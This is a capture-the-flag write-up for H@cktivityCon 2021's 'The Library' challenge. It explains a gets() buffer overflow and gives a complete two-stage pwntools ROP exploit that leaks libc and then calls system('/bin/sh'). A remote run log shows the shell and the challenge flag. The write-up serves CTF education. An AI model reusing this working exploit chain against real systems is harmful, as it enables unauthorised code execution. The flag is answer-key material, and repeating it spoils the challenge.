# H@cktivityCon 2021 CTF

## The Library


> Welcome to The Library. I'm thinking of a book can you guess it? 
> 
> 362
> 
> [`the_library`](the_library) [`libc-2.31.so`](libc-2.31.so)
>
> author: @M_alpha#3534

Tags: _pwn_ _bof_ _rop_ _x86-64_ _remote-shell_


## Summary

Basic ROP chain; leak libc address; second pass; get a shell.

> I have 10s of these in my repo, so I'll be a bit terse.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No PIE/Canary, easy BOF/ROP.
    

### Decompile with Ghidra

```c
undefined8 main(void)
{
  int iVar1;
  char local_228 [520];
  uint local_20;
  int local_1c;
  FILE *local_18;
  int local_c;
  
  local_18 = (FILE *)0x0;
  local_18 = fopen("/dev/urandom","r");
  if (local_18 == (FILE *)0x0) {
    exit(1);
  }
  fread(&local_20,4,1,local_18);
  fclose(local_18);
  srand(local_20);
  puts("Welcome to The Library.\n");
  puts("Books:");
  for (local_c = 0; local_c < 6; local_c = local_c + 1) {
    printf("%d. %s\n",(ulong)(local_c + 1),*(undefined8 *)(BOOKS + (long)local_c * 8));
  }
  puts("");
  puts("I am thinking of a book.");
  puts("Which one is it?");
  printf("> ");
  gets(local_228);
  local_1c = atoi(local_228);
  iVar1 = rand();
  if (local_1c == iVar1 % 5 + 1) {
    puts("Correct!");
  }
  else {
    puts("Wrong :(");
  }
  return 0;
}
```

`gets` is the vulnerability.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./the_library')

if args.REMOTE:
    p = remote('challenge.ctf.games', 31125)
    libc = ELF('./libc-2.31.so')
else:
    p = process(binary.path)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
```

Standard pwntools starter.

```python
pop_rdi = next(binary.search(asm('pop rdi; ret')))

payload  = b''
payload += 0x228 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.main)

p.sendlineafter(b'> ',payload)
p.recvline()
puts = u64(p.recv(6) + b'\0\0')
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))
```

Above is the first pass.  Overflow the buffer with `0x228` (see `local_228` in the decomp) bytes of garbage, followed by a ROP chain that will leak the libc address, then loop back to `main` for a second pass.

Since libc was provided it is not necessary to identify the version of libc.

```python
payload  = b''
payload += 0x228 * b'A'
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh').__next__())
payload += p64(libc.sym.system)

p.sendlineafter(b'> ',payload)
p.recvline()
p.interactive()
```

With the libc address known, the second pass just starts up a shell.  The `pop_rdi+1` is really just a `ret` used to align the stack.

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/hacktivityctf2021/the_library/the_library'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to challenge.ctf.games on port 31125: Done
[*] '/pwd/datajerk/hacktivityctf2021/the_library/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc.address: 0x7fdd87737000
[*] Switching to interactive mode
$ cat flag.txt
flag{54b7742240a85bf62aa6fcf16c7e66a4}
```
